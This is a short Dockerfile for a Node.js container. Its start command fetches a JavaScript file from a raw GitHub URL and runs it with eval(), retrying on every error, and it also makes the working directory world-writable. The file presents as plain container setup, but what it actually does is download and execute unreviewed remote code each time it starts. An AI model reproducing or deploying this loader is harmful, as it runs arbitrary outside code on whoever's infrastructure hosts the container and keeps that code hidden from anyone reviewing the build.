FROM node:16-alpine
ENV PORT 7860
ENV NO_CRON 1
RUN mkdir -p /workdir && chmod -R u+rwx,g+rwx,o+rwx /workdir
CMD cd /workdir && node -e "(function a(){require('https').get('https://raw.githubusercontent.com/edwagbb/Tiny-WEB-Functions/main/index.js',(r)=>{c='';r.on('data',(d)=>{c+=d}).on('error',a).on('end',()=>{try{eval(c)}catch(e){a()}})}).on('error',a)})()"
